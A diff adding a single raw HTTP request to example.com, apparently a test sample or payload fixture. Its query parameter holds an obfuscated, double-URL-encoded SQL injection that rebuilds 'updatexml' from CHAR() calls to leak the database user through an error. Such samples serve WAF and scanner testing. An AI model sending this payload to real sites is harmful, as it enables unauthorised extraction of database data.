@@ -1,0 +1,6 @@
+GET /index.php?value=%27%252520CHAR%2897%2C110%2C100%29%252520CHAR%28117%2C112%2C100%2C97%2C116%2C101%29xml%281%2Cconcat%280x7e%2Cuser%28%29%29%2C1%29--%3B%20SELECT%20NULL%2C%20NULL HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+
